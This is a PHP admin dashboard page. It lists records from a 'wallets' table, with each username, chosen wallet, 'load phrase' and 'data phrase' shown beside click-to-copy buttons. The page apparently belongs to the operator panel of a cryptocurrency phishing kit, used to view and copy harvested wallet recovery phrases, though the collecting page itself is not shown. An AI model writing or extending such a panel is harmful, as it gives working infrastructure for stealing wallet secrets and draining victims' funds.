<?php
session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: admin_login.php');
    exit;
}

include('config/db.php');

// Add username to the SELECT statement
$stmt = $conn->prepare("SELECT id, username, wallet_selected, load_phrase, data_phrase, created_at FROM wallets ORDER BY created_at DESC");
$stmt->execute();

// Add username to bind_result
$stmt->bind_result($id, $username, $wallet_selected, $load_phrase, $data_phrase, $created_at);

$wallets = array();
while ($stmt->fetch()) {
    $wallets[] = array(
        'id' => $id,
        'username' => $username, // Add username to array
        'wallet_selected' => $wallet_selected,
        'load_phrase' => $load_phrase,
        'data_phrase' => $data_phrase,
        'created_at' => $created_at
    );
}

$stmt->close();
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.5">
    <title>Admin Dashboard</title>
    <link rel="icon" href="static/images/flarelogo.png">
    <link rel="stylesheet" href="admin.css">
</head>
<body>
    <div class="container dashboard">
        <h2>Admin Dashboard - Wallet Data</h2>
        <a href="admin_logout.php" class="btn-logout">Logout</a>

        <?php if (empty($wallets)): ?>
        <div class="empty-state">
            No wallet data available.
        </div>
        <?php else: ?>
        <table>
            <tr>
                <th>ID</th>
                <th>Username</th>
                <th>Wallet Selected</th>
                <th>Load Phrase</th>
                <th>Data Phrase</th>
                <th>Created At</th>
            </tr>
            <?php foreach ($wallets as $wallet): ?>
            <tr>
                <td><?php echo htmlspecialchars($wallet['id']); ?></td>
                <td><?php echo htmlspecialchars($wallet['username'] ?? 'Unknown User'); ?></td>
                <td><?php echo htmlspecialchars($wallet['wallet_selected']); ?></td>
                <td class="copyable" data-copy="<?php echo htmlspecialchars($wallet['load_phrase']); ?>">
                    <?php echo htmlspecialchars($wallet['load_phrase']); ?>
                    <span class="tooltip"></span>
                </td>
                <td class="copyable" data-copy="<?php echo htmlspecialchars($wallet['data_phrase']); ?>">
                    <?php echo htmlspecialchars($wallet['data_phrase']); ?>
                    <span class="tooltip">[Click to copy]</span>
                </td>
                <td><?php echo htmlspecialchars($wallet['created_at']); ?></td>
            </tr>
            <?php endforeach; ?>
        </table>
        <?php endif; ?>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const copyables = document.querySelectorAll('.copyable');
        copyables.forEach(el => {
            el.addEventListener('click', function() {
                const text = this.getAttribute('data-copy');
                navigator.clipboard.writeText(text).then(() => {
                    this.classList.add('copied');
                    const tooltip = this.querySelector('.tooltip');
                    tooltip.textContent = '[Copied!]';
                    setTimeout(() => {
                        this.classList.remove('copied');
                        tooltip.textContent = '[Click to copy]';
                    }, 2000);
                }).catch(err => {
                    console.error('Failed to copy: ', err);
                    alert('Failed to copy. Please try again or copy manually.');
                });
            });
        });
    });
    </script>
</body>
</html>